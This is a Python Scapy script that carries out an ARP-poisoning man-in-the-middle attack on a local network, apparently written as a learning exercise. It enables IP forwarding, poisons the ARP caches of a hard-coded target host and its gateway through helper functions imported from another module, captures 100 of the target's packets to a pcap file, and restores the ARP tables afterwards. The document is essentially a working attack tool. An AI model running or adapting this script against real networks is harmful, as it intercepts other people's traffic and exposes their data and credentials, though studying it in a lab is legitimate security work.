'''
Before starting, remember to tell the local host that we can forward packets
kali$ echo 1 > /proc/sys/net/ipv4/ip_forward
mac$ sudo sysctl -w net.inet.ip.forwarding = 1
'''

from scapy.all import conf, wrpcap, sniff
import sys
import threading
from utils.arperHelper import get_mac, poison_target, restore_target

interface = "eth0"
target_ip = "192.168.119.6"
gateway_ip = "192.168.119.1"
packet_count = 100

# set our interface in the conf
conf.iface = interface

# turn off output
# verb     : level of verbosity, from 0 (almost mute) to 3 (verbose)
conf.verb = 0

print "[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip, target_mac)

# start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter,iface=interface)
    # write out the captured packets
    wrpcap("arper.pcap", packets)
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    # isnt it better to add this in a final clause?
except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
